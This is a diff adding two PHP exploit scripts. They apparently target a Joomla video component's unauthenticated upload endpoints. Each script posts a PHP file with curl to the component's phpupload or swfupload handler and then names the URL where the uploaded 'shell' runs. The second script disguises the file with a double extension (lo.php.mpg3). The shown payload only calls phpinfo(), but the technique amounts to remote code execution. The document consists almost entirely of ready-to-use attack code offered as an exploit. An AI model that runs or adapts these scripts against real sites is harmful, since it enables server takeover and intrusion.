@@ -1,0 +1,57 @@
+Exploit 1 :
+
+PostShell.php
+
+<?php
+
+$uploadfile="lo.php";
+
+$ch = 
+curl_init("http://www.example.com/components/com_dv/externals/phpupload/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+                array('file1'=>"@$uploadfile",
+                'action'=>'upload'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+
+print "$postResult";
+
+?>
+
+Shell Access : http://www.example.com/lo.php
+
+lo.php
+<?php
+phpinfo();
+?>
+
+
+Exploit 2 :
+
+PostShell2.php
+
+<?php
+
+$uploadfile="lo.php.mpg3";
+
+$ch = 
+curl_init("http://www.example.com/components/com_dv/externals/swfupload/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+                array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+
+print "$postResult";
+
+?>
+
+Shell Access : http://www.example.com/dvvideos/uploads/originals/lo.php.mpg3
+
+lo.php.mpg3
+<?php
+phpinfo();
+?>
